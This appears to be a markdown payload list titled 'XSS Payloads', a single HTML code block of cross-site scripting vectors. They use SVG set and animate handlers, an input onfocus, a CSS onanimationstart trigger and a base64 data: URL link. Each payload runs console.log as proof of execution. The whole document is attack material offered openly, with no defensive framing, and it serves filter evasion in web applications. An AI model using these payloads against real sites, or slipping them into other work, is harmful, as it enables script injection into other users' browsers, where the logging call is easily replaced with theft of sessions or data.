# XSS Payloads

```html
<svg xmlns="http://www.w3.org/2000/svg">
  <set attributeName="onmouseover" to="setTimeout(() => console.log('XSS Triggered'), 1000)" />
  <text x="10" y="20">Hover me</text>
</svg>

<input type="text" onfocus="console.log('XSS Triggered')" value="Click to Focus">

<div style="animation: xss 1s;" onanimationstart="console.log('XSS Triggered')">Trigger Animation</div>
<style>
@keyframes xss { from { opacity: 0; } to { opacity: 1; } }
</style>

<svg xmlns="http://www.w3.org/2000/svg">
  <animate attributeName="xlink:href" to="javascript:console.log('XSS Triggered')" dur="1s" />
</svg>

<a href="data:text/html;base64,PGltZyBzcmM9b25lcnJvciBvbmxvYWQ9Y29uc29sZS5sb2coJ1hTUyBUcmlnZ2VyZWQnKTs+" >Click me</a>
